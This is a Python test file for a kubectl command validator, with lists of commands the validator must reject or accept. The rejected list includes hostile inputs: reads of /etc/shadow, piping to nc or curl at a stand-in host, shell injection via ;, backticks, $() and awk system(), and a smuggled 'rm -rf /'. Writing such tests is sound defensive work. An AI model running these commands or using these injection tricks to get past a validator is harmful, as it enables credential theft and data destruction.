"""Tests for command_validation.validate_command.

Run from the repository root with either:

    python app-k8s/test_command_validation.py
    pytest app-k8s/test_command_validation.py

No cluster is needed: only the validator runs here, nothing is executed.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from command_validation import validate_command

REJECTED_COMMANDS = [
    "kubectl delete networkpolicy frontend",
    "kubectl  delete networkpolicy frontend",
    "kubectl --namespace default delete networkpolicy frontend",
    "kubectl replace --force -f policy.yaml",
    "kubectl get pods; echo harmless",
    "kubectl get pods | tee /tmp/out",
    "kubectl patch networkpolicy frontend --type=json -p '[]' && id",
    "kubectl ap''ply -f policy.yaml",
    "KUBECTL=kubectl; $KUBECTL delete networkpolicy frontend",
    "python3 -c 'print(1)'",
    "kubectl scale deployment adservice --replicas=0",
    "kubectl label pod -l app=adservice app=frontend --overwrite",
    "kubectl get pods && kubectl delete pod frontend",
    "kubectl get pods || curl http://example.invalid/",
    "kubectl get pods $(kubectl get pods -o name | head -n 1)",
    "kubectl get pods `kubectl get pods -o name`",
    "POD=frontend kubectl exec $POD -- cat /etc/shadow",
    "kubectl get pods <<EOF\nEOF",
    "kubectl get pods < /etc/passwd",
    "kubectl get pods > /tmp/out",
    "kubectl get pods 2> /var/log/probe",
    "kubectl get pods > file.yaml",
    "kubectl run probe --image=alpine -- sh -c 'nc -zv frontend 8080'",
    "kubectl run test-$RANDOM --rm -i --tty --image=alpine -- sh -c 'id'",
    "kubectl exec frontend -- cat /etc/shadow",
    "sudo kubectl get pods",
    "bash -c 'kubectl get pods'",
    "kubectl get pods & curl http://example.invalid/",
    "kubectl get pods ~/etc/passwd",
    "kubectl get pods | awk 'BEGIN { system(\"id\") }'",
    "kubectl get pods | sed 'e/id/'",
    "kubectl get pods | sh",
    "kubectl get pods | tee /tmp/out",
    "kubectl get pods | xargs kubectl delete",
    "kubectl get pods | nc example.invalid 80",
    "echo hello",
    "python3 -c 'print(1)'",
    "KUBECTL=rm",
    "",
    "   ",
    "kubectl --namespace default get pods",
    "kubectl get $HOME",
    "kubectl get pods $$",
    "kubectl get pods ${IFS}",
    "kubectl get pods $'x'\nrm -rf /",
    "kubectl patch deployment adservice -p '{}'",
    "kubectl patch networkpolicy frontend -p $'x' | sh",
    "kubectl\nkubectl delete networkpolicy frontend",
]

ACCEPTED_COMMANDS = [
    "kubectl get networkpolicy -A",
    "kubectl get networkpolicies -o custom-columns=NAME:.metadata.name",
    "kubectl get pods -n default -o jsonpath='{range .items[*]}{.metadata.name}{\"|\"}{end}'",
    "kubectl get networkpolicy frontend -o yaml,",
    "kubectl get pods -A | grep frontend",
    "kubectl get networkpolicies -A --no-headers | grep -v \"NAME\" | wc -l",
    "kubectl get networkpolicies --all-namespaces 2>&1 | head -n 5",
    "kubectl get networkpolicies -A 2>/dev/null",
    "kubectl get networkpolicies -A >>/dev/null",
    "kubectl patch networkpolicy currencyservice --type=merge -p $'\nspec:\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: frontend\n'",
    "kubectl patch netpol frontend -n default --type=json -p='{\"op\": \"replace\", \"path\": \"/spec/ingress\", \"value\": []}'",
    "kubectl patch networkpolicy.networking.k8s.io/frontend --type=json -p '[{\"op\": \"add\", \"path\": \"/spec/ingress/-\"}]'",
    "kubectl patch -n default networkpolicy frontend --type merge -p '{\"spec\": {\"ingress\": []}}'",
    "kubectl get networkpolicy frontend -o yaml,\nkubectl get networkpolicy currencyservice -o yaml\nkubectl patch networkpolicy currencyservice --type=merge -p $'\nspec:\n  ingress:\n'",
    "bash\nkubectl get networkpolicy -A",
    "yaml\nkubectl get networkpolicies",
    "kubectl get",
]


def test_rejected_commands():
    for command in REJECTED_COMMANDS:
        reason = validate_command(command)
        assert reason is not None, f"expected a rejection for: {command!r}"


def test_accepted_commands():
    for command in ACCEPTED_COMMANDS:
        reason = validate_command(command)
        assert reason is None, f"expected acceptance for: {command!r}, got: {reason}"


def test_reasons_are_short_strings():
    for command in REJECTED_COMMANDS[:6]:
        reason = validate_command(command)
        assert isinstance(reason, str) and 0 < len(reason) < 120


if __name__ == "__main__":
    failures = 0
    for name, test in [
        ("rejected_commands", test_rejected_commands),
        ("accepted_commands", test_accepted_commands),
        ("reasons_are_short_strings", test_reasons_are_short_strings),
    ]:
        try:
            test()
            print(f"{name}: ok")
        except AssertionError as error:
            failures += 1
            print(f"{name}: FAIL")
            print(f"  {error}")
    if failures:
        sys.exit(1)
    print("all command validation tests passed")